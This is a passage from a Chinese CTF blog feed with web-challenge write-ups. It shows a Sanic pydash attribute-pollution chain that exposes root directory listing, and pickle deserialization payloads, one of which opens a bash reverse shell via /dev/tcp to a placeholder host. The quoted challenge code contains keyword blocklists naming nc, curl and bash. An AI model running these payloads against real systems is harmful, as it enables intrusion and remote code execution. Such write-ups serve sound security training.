    <content type="html"><![CDATA[<h2 id="sanic">sanic</h2><p>先看源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="/post/3b6915e3/IMAGE20250228172711690.png" class=""><p>可以看到登录是根据cookie的参数进行判断，但是这里有一个;如果我们传入;会截断，所以使用八进制编码绕过即可。</p><img src="/post/3b6915e3/IMAGE20250228173709994.png" class=""><p>admin路由可以直接污染，但是存在waf <code>_.</code>使用<code>\\\\</code> 可以绕过。接下来就是污染__file__属性值了<br>因为在src路由里有一个读文件的操作。</p><img src="/post/3b6915e3/IMAGE20250228173829761.png" class=""><img src="/post/3b6915e3/IMAGE20250228173940256.png" class=""><p>污染成功，所以现在要做的就是要找到flag的文件名，这也就是这题的考点如何利用污染列目录。</p><p>来看static这个函数</p><img src="/post/3b6915e3/IMAGE20250228174123917.png" class=""><p>这里的directory_view和directory_handler属性需要关注一下因为解释中说的是</p><img src="/post/3b6915e3/IMAGE20250228174202765.png" class=""><p>大概意思就是directory_view为True时，会开启列目录功能，directory_handler中可以获取指定的目录。跟进directory_handler看看</p><img src="/post/3b6915e3/IMAGE20250228174455369.png" class=""><p>他调用的是DirectoryHandler这个类</p><img src="/post/3b6915e3/IMAGE20250228174355761.png" class=""><p>所以如果能够污染 directory为 /  directory_view为True就可以列根目录了</p><p>通过查看别的师傅的文章，发现可以通过app.router.name_index[‘xxxxx’]来获取注册的路由，该写下源码调试看看</p><img src="/post/3b6915e3/IMAGE20250228175821707.png" class=""><p>可以看到已经有注册的路由，那怎么找到DirectoryHandler他呢。全局搜一下name_index</p><img src="/post/3b6915e3/IMAGE20250228180136279.png" class=""><p>找到系统默认的调用点，下断点调试，找到handler</p><img src="/post/3b6915e3/IMAGE20250228180311949.png" class=""><p>可以看到需要的两个变量。所以可以污染了</p><p>directory_view</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span>,<span class="string">&quot;value&quot;</span>: <span class="literal">True</span>&#125;</span><br></pre></td></tr></table></figure><p>directory</p><p>这里不能直接污染因为他不是字符串类型</p><img src="/post/3b6915e3/IMAGE20250228180640161.png" class=""><p>在原来的地方看一下</p><img src="/post/3b6915e3/IMAGE20250228180731036.png" class=""><p>是一个path对象跟进看看</p><img src="/post/3b6915e3/IMAGE20250228180933887.png" class=""><p>最后是给了_parts，看一下这个属性</p><img src="/post/3b6915e3/IMAGE20250228181227467.png" class=""><p>是列表类型，直接污染</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span>,<span class="string">&quot;value&quot;</span>: [<span class="string">&quot;/&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><img src="/post/3b6915e3/IMAGE20250228175037662.png" class=""><p>最后在污染 <code>__file__</code>  变量就可以了</p><p>汇总</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启列目录功能</span></span><br><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span>,<span class="string">&quot;value&quot;</span>: true&#125;</span><br><span class="line"><span class="comment">#将目录设置在根目录下&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;</span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;sanic&quot;&gt;sanic&lt;/h2&gt;
&lt;p&gt;先看源码&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;sp</summary>
      
    
    
    
    <category term=" CTF" scheme="https://oceanzbz.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://oceanzbz.github.io/tags/CTF/"/>
    
    <category term="复现" scheme="https://oceanzbz.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="web" scheme="https://oceanzbz.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题</title>
    <link href="https://oceanzbz.github.io/post/639d78a4.html"/>
    <id>https://oceanzbz.github.io/post/639d78a4.html</id>
    <published>2025-02-26T07:59:42.000Z</published>
    <updated>2025-03-05T07:24:36.806Z</updated>
    
    <content type="html"><![CDATA[<h3 id="DASCTF-2024最后一战｜寒夜破晓，冬至终章">DASCTF 2024最后一战｜寒夜破晓，冬至终章]</h3><h4 id="const-python">const_python</h4><p>题目描述：自认为搭建了一个完美的web应用，不会有问题，很自信地在src存放了源码，应该不会有人能拿到/flag的内容。</p><p>所以直接访问 /src查看源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request,jsonify,session</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password, auth=<span class="string">&#x27;ctfer&#x27;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line">        <span class="variable language_">self</span>.auth = auth</span><br><span class="line"></span><br><span class="line">password = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">Admin = User(<span class="string">&#x27;admin&#x27;</span>, password,<span class="string">&quot;admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Welcome to my application&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> :</span><br><span class="line">            <span class="keyword">if</span> password == admin.password:</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Welcome Admin&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Invalid Credentials&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;!-- /src may help you&gt;</span></span><br><span class="line"><span class="string">            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppicklee</span>():</span><br><span class="line">    data = request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&quot;not allowed&quot;</span></span><br><span class="line">    sys.modules[<span class="string">&#x27;sys&#x27;</span>] = <span class="string">&quot;not allowed&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        pickle_data = base64.b64decode(data)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> &#123;<span class="string">&quot;os&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&#x27;setstate&#x27;</span>, <span class="string">&quot;globals&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;template&#x27;</span>, <span class="string">&#x27;render&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;requests&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>,  <span class="string">&#x27;pickle&#x27;</span>,<span class="string">&quot;class&quot;</span>,<span class="string">&quot;mro&quot;</span>,<span class="string">&quot;flask&quot;</span>,<span class="string">&quot;sys&quot;</span>,<span class="string">&quot;base&quot;</span>,<span class="string">&quot;init&quot;</span>,<span class="string">&quot;config&quot;</span>,<span class="string">&quot;session&quot;</span>&#125;:</span><br><span class="line">            <span class="keyword">if</span> i.encode() <span class="keyword">in</span> pickle_data:</span><br><span class="line">                <span class="keyword">return</span> i+<span class="string">&quot; waf !!!!!!!&quot;</span></span><br><span class="line"></span><br><span class="line">        pickle.loads(pickle_data)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success pickle&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail pickle&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    username = session[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> username != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&#x27;You are not admin!&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Welcome Admin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src</span>():</span><br><span class="line">    <span class="keyword">return</span>  <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>这题一眼pickle反序列化直接打就行，不过发现黑名单禁用了很多执行命令的函数，但是builtins这个模块中有subprocess，可以代替os.popen<br>参考：<a href="https://blog.csdn.net/cc20100608/article/details/139285386">Python 的 subprocess 介绍及如何使用-CSDN博客</a></p><p>也可直接覆盖。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#这里命令不能直接用bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1</span></span><br><span class="line">        <span class="keyword">return</span> (subprocess.run, ([<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1&quot;</span>],))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><p>覆盖文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">import</span> subprocess  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">return</span> (subprocess.check_output, ([<span class="string">&quot;cp&quot;</span>,<span class="string">&quot;/flag&quot;</span>,<span class="string">&quot;/app/app.py&quot;</span>],))  </span><br><span class="line">a=A()  </span><br><span class="line">b=pickle.dumps(a)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h4 id="yaml-matser">yaml_matser</h4><p>直接看源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&#x27;templates&#x27;</span>)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">input_str</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    blacklist_terms = &#123;<span class="string">&#x27;apply&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;sleep&#x27;</span>, <span class="string">&#x27;setstate&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;command&#x27;</span>,<span class="string">&#x27;static&#x27;</span>,<span class="string">&#x27;templates&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span></span><br><span class="line">                       <span class="string">&#x27;run&#x27;</span>, <span class="string">&#x27;ntimeit&#x27;</span>, <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;nc&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;before_request&#x27;</span>, <span class="string">&#x27;after_request&#x27;</span>,</span><br><span class="line">                       <span class="string">&#x27;error_handler&#x27;</span>, <span class="string">&#x27;add_url_rule&#x27;</span>,<span class="string">&#x27;teardown_request&#x27;</span>,<span class="string">&#x27;teardown_appcontext&#x27;</span>,<span class="string">&#x27;\\u&#x27;</span>,<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>,<span class="string">&#x27;join&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    input_str_lower = <span class="built_in">str</span>(input_str).lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> term <span class="keyword">in</span> blacklist_terms:</span><br><span class="line">        <span class="keyword">if</span> term <span class="keyword">in</span> input_str_lower:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found blacklisted term: <span class="subst">&#123;term&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">file_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;.*\.yaml$&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_yaml_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(file_pattern.<span class="keyword">match</span>(filename))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to DASCTF X 0psu3</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;/Yam1&quot;&gt;Yam1&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            uploaded_file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> uploaded_file <span class="keyword">and</span> is_yaml_file(uploaded_file.filename):</span><br><span class="line">                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)</span><br><span class="line">                uploaded_file.save(file_path)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;uploaded successfully&quot;</span>&#125;), <span class="number">200</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Just YAML file&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 